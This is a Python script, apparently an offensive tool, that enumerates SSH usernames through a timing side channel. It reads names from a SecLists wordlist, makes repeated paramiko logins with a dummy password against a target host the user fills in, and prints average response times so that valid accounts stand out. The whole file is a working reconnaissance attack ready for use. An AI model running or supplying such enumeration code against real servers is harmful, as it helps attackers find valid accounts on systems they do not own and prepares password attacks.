import paramiko
import time
import statistics
import os

def check_username(hostname, port, username, attempts=5, timeout=10):
    response_times = []

    for _ in range(attempts):
        try:
            # Create an SSH client
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

            # Record the start time
            start_time = time.time()

            # Attempt to connect using a given username
            try:
                client.connect(hostname, port=port, username=username, password='invalidpassword', timeout=timeout)
            except paramiko.AuthenticationException:
                pass  # This is expected for invalid credentials
            except paramiko.SSHException as e:
                print(f"SSHException: {e}")
                return
            except Exception as e:
                print(f"Connection failed: {e}")
                return
            finally:
                # Record the end time
                end_time = time.time()
                client.close()

            response_time = end_time - start_time
            response_times.append(response_time)

        except Exception as e:
            print(f"Failed to check username {username}: {str(e)}")

    if response_times:
        avg_response_time = statistics.mean(response_times)
        stddev_response_time = statistics.stdev(response_times) if len(response_times) > 1 else 0
        print(f"Username: {username}, Avg Response Time: {avg_response_time:.4f} seconds, Std Dev: {stddev_response_time:.4f}")

def main():
    host = ""  #Fill in your target IP
    port = 443  #target SSH port

    #Use your own Path to the wordlist
    wordlist_path = "/usr/share/wordlists/SecLists-master/Usernames/Names/names.txt"
    
    #Quick check if the wordlist file exists
    if not os.path.exists(wordlist_path):
        print(f"Wordlist file not found: {wordlist_path}")
        return

    #Read usernames from the wordlist
    with open(wordlist_path, 'r') as file:
        usernames = [line.strip() for line in file if line.strip()]

    # Test each username from the wordlist
    for username in usernames:
        check_username(host, port, username)

if __name__ == "__main__":
    main()
